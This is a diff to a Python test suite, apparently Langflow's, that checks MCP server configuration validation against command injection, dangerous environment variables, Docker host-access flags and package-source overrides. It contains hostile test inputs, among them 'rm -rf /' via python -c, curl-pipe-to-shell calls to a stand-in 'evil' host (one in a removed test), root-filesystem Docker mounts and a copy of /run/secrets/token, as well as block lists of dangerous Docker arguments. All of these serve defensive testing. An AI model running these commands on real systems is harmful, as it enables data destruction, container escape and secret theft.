@@ -12,8 +12,13 @@ in MCPServerConfig schema.
 """
 
 import pytest
-from langflow.api.v2.schemas import MCPServerConfig
-from lfx.base.mcp.security import ALLOWED_MCP_COMMANDS, DANGEROUS_ENV_VARS
+from langflow.api.v2.schemas import (
+    ALLOWED_MCP_COMMANDS,
+    DANGEROUS_ENV_VARS,
+    DOCKER_DANGEROUS_ARG_PREFIXES,
+    DOCKER_DANGEROUS_ARGS,
+    MCPServerConfig,
+)
 from pydantic import ValidationError
 
 
@@ -22,11 +27,39 @@ class TestMCPCommandInjectionSecurity:
 
     # ==================== Command Validation Tests ====================
 
+    def test_historical_docker_policy_constants_remain_importable(self):
+        assert frozenset({"--privileged", "--cap-add"}) == DOCKER_DANGEROUS_ARGS
+        assert DOCKER_DANGEROUS_ARG_PREFIXES == (
+            "--net=",
+            "--network=",
+            "--pid=",
+            "--cap-add=",
+            "--privileged=",
+        )
+
     def test_allowed_commands_accepted(self):
         """Test that all allowed commands are accepted."""
-        for command in ALLOWED_MCP_COMMANDS:
-            config = MCPServerConfig(command=command, args=["--version"])
+        valid_args_by_command = {
+            "bash": ["-c", "node server.js"],
+            "cmd": ["/c", "node", "server.js"],
+            "docker": ["run", "--rm", "-i", "mcp-image"],
+            "node": ["server.js"],
+            "npx": ["@modelcontextprotocol/server-filesystem", "/workspace"],
+            "python": ["-m", "mcp_server"],
+            "python3": ["-m", "mcp_server"],
+            "sh": ["-c", "node server.js"],
+            "uvx": ["mcp-proxy"],
+        }
+
+        assert valid_args_by_command.keys() == ALLOWED_MCP_COMMANDS
+        for command, args in valid_args_by_command.items():
+            config = MCPServerConfig(command=command, args=args)
             assert config.command == command
+
+    def test_npx_unapproved_flag_rejected(self):
+        """Test that npx flags must be explicitly approved by the source policy."""
+        with pytest.raises(ValidationError, match="Argument '--version' is not allowed"):
+            MCPServerConfig(command="npx", args=["--version"])
 
     def test_allowed_command_with_path_accepted(self):
         """Test that allowed commands with full paths are accepted."""
@@ -34,9 +67,17 @@ class TestMCPCommandInjectionSecurity:
         config = MCPServerConfig(command="/usr/bin/node", args=["server.js"])
         assert config.command == "/usr/bin/node"
 
+        # Unix-style path with spaces in a parent directory
+        config = MCPServerConfig(command="/opt/Node Tools/node", args=["server.js"])
+        assert config.command == "/opt/Node Tools/node"
+
         # Windows-style path
         config = MCPServerConfig(command="C:\\Program Files\\nodejs\\node.exe", args=["server.js"])
         assert config.command == "C:\\Program Files\\nodejs\\node.exe"
+
+        # Windows-style path using forward slashes
+        config = MCPServerConfig(command="C:/Program Files/nodejs/node.exe", args=["server.js"])
+        assert config.command == "C:/Program Files/nodejs/node.exe"
 
     def test_dangerous_command_rejected(self):
         """Test that dangerous commands are rejected."""
@@ -93,12 +134,11 @@ class TestMCPCommandInjectionSecurity:
                 or ("not allowed" in error_msg)
             )
 
-    def test_c_flag_blocked_for_non_shell_commands(self):
-        """Test that -c flag is blocked for non-shell commands like python/node."""
+    def test_c_flag_blocked_for_python_commands(self):
+        """Test that the Python code-execution flag is blocked."""
         dangerous_c_usage = [
             ("python", ["-c", "import os; os.system('rm -rf /')"]),
             ("python3", ["-c", "malicious code"]),
-            ("node", ["-c", "require('child_process').exec('evil')"]),
             ("python", ["-Lc", "import os"]),
         ]
 
@@ -109,42 +149,37 @@ class TestMCPCommandInjectionSecurity:
             error_msg = str(exc_info.value)
             assert "-c" in error_msg.lower() or "/c" in error_msg.lower()
 
-    def test_command_with_arguments_in_string_accepted(self):
-        """Test that commands with arguments in a single string are accepted (frontend compatibility).
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx mcp-server-fetch",
+            "npx -y @modelcontextprotocol/server-fetch",
+            "python -m mcp_server",
+            "node\t--version",
+            " node",
+            "node ",
+            "/usr/bin/node --version",
+            "C:\\Program Files\\nodejs\\node.exe --version",
+        ],
+    )
+    def test_command_with_embedded_arguments_rejected(self, command):
+        """The command field is one executable; all options belong in validated args."""
+        with pytest.raises(ValidationError, match="single executable"):
+            MCPServerConfig(command=command, args=[])
+        with pytest.raises(ValidationError, match="single executable"):
+            MCPServerConfig(command=command, args=None)
 
-        Frontend tests pass commands like "uvx mcp-server-fetch" as a single string.
-        The validation should extract only the base command (uvx) for allowlist checking.
-        """
-        # This is how the frontend test passes the command
-        config = MCPServerConfig(command="uvx mcp-server-fetch", args=None)
-        assert config.command == "uvx mcp-server-fetch"
-
-        # Other examples
-        config = MCPServerConfig(command="npx @modelcontextprotocol/server-fetch", args=None)
-        assert config.command == "npx @modelcontextprotocol/server-fetch"
-
-        config = MCPServerConfig(command="python -m mcp_server", args=None)
-        assert config.command == "python -m mcp_server"
-
-    def test_command_packed_payload_with_empty_args_rejected(self):
-        """A payload packed entirely into the command string (empty args) must be rejected.
-
-        Regression for the bypass where the command/args checks only inspected `args`: a tenant
-        set command="bash -c '<payload>'" with args=[] and reached `bash -c "exec ..."`. The
-        command is now tokenized so the embedded payload is subject to all checks.
-        """
-        packed = [
-            "bash -c 'curl http://evil|sh'",
-            "sh -c id",
-            "bash -c rm",
-            "python -c import os",
-            "uvx; curl http://evil",
-        ]
-        for cmd in packed:
-            with pytest.raises(ValidationError):
-                MCPServerConfig(command=cmd, args=[])
-            with pytest.raises(ValidationError):
-                MCPServerConfig(command=cmd, args=None)
+    @pytest.mark.parametrize(
+        ("command", "args"),
+        [
+            ("python3", ["pip install requests"]),
+            ("node", ["npm install evil"]),
+            ("python3", ["pip,install,requests"]),
+        ],
+    )
+    def test_dangerous_keywords_cannot_be_packed_into_one_argument(self, command, args):
+        with pytest.raises(ValidationError, match="dangerous keyword"):
+            MCPServerConfig(command=command, args=args)
 
     def test_command_injection_via_semicolon_rejected(self):
         """Test that command injection via semicolon is rejected."""
@@ -671,6 +706,27 @@ class TestMCPCommandInjectionSecurity:
         assert config.env is not None
         assert config.env["DEBUG"] == "true"
 
+    @pytest.mark.parametrize(
+        "env_var",
+        ["NPM_CONFIG_REGISTRY", "UV_DEFAULT_INDEX", "UV_INDEX_URL", "PIP_INDEX_URL"],
+    )
+    def test_package_source_env_vars_rejected(self, env_var):
+        with pytest.raises(ValidationError, match="not allowed"):
+            MCPServerConfig(
+                command="uvx",
+                args=["mcp-server"],
+                env={env_var: "https://packages.example.invalid/simple"},
+            )
+
+    def test_provider_credential_env_var_remains_accepted(self):
+        config = MCPServerConfig(
+            command="npx",
+            args=["@modelcontextprotocol/server-github"],
+            env={"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
+        )
+
+        assert config.env == {"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"}
+
     def test_none_env_accepted(self):
         """Test that None env is accepted."""
         config = MCPServerConfig(command="node", args=["server.js"])
@@ -685,6 +741,18 @@ class TestMCPCommandInjectionSecurity:
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
+
+    @pytest.mark.parametrize(
+        "args",
+        [
+            ["cp", "other:/run/secrets/token", "/workspace/token"],
+            ["inspect", "other"],
+            ["network", "connect", "shared", "other"],
+        ],
+    )
+    def test_docker_non_run_subcommands_rejected(self, args):
+        with pytest.raises(ValidationError, match="not allowed"):
+            MCPServerConfig(command="docker", args=args)
 
     def test_docker_net_host_rejected(self):
         """Test that docker --net=host is rejected."""
@@ -717,6 +785,84 @@ class TestMCPCommandInjectionSecurity:
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
+
+    @pytest.mark.parametrize(
+        "host_access_args",
+        [
+            ["-v", "/:/host"],
+            ["-iv", "/:/host"],
+            ["--volume", "/var/run:/host/run"],
+            ["--volume=/var/run:/host/run"],
+            ["--mount", "type=bind,source=/,target=/host"],
+            ["--mount=type=bind,source=/,target=/host"],
+            ["--volumes-from", "other"],
+            ["--device", "/dev/example"],
+            ["--device=/dev/example"],
+            ["--device-cgroup-rule", "b 8:0 rwm"],
+            ["--pid", "host"],
+            ["--ipc=container:other"],
+            ["--uts", "host"],
+            ["--network", "host"],
+            ["--net=container:other"],
+            ["--security-opt", "seccomp=unconfined"],
+            ["--security-opt=apparmor=unconfined"],
+            ["--security-opt", "label:disable"],
+        ],
+    )
+    def test_docker_host_access_args_rejected(self, host_access_args):
+        with pytest.raises(ValidationError, match="not allowed"):
+            MCPServerConfig(command="docker", args=["run", *host_access_args, "mcp-image"])
+
+    @pytest.mark.parametrize(
+        ("command", "args"),
+        [
+            ("uvx", ["--default-index", "https://packages.example.invalid/simple", "mcp-server"]),
+            ("uvx", ["--index-url=https://packages.example.invalid/simple", "mcp-server"]),
+            ("uvx", ["--from", "git+https://code.example.invalid/server.git", "mcp-server"]),
+            ("uvx", ["https://packages.example.invalid/server.whl"]),
+            ("npx", ["--registry=https://packages.example.invalid", "@example/mcp-server"]),
+            ("npx", ["--package", "git+https://code.example.invalid/server.git"]),
+            ("npx", ["https://packages.example.invalid/server.tgz"]),
+            ("sh", ["-c", "uvx --default-index https://packages.example.invalid/simple mcp-server"]),
+            ("cmd", ["/c", "docker", "run", "--mount", "type=bind,source=/,target=/host", "mcp-image"]),
+        ],
+    )
+    def test_package_source_selection_args_rejected(self, command, args):
+        with pytest.raises(ValidationError, match="not allowed"):
+            MCPServerConfig(command=command, args=args)
+
+    def test_trusted_uvx_from_package_is_accepted(self):
+        config = MCPServerConfig(
+            command="uvx",
+            args=["--from", "lfx", "lfx-mcp"],
+            env={
+                "LANGFLOW_SERVER_URL": "https://langflow.example.com",
+                "LANGFLOW_API_KEY": "token",  # pragma: allowlist secret
+            },
+        )
+
+        assert config.args == ["--from", "lfx", "lfx-mcp"]
+
+    def test_isolated_docker_options_remain_accepted(self):
+        config = MCPServerConfig(
+            command="docker",
+            args=[
+                "run",
+                "--rm",
+                "-i",
+                "--entrypoint",
+                "mcp-server",
+                "-u",
+                "1000",
+                "--network",
+                "bridge",
+                "--security-opt",
+                "no-new-privileges",
+                "mcp-image",
+            ],
+        )
+
+        assert config.command == "docker"
 
     def test_docker_safe_args_accepted(self):
         """Test that safe Docker arguments are accepted."""
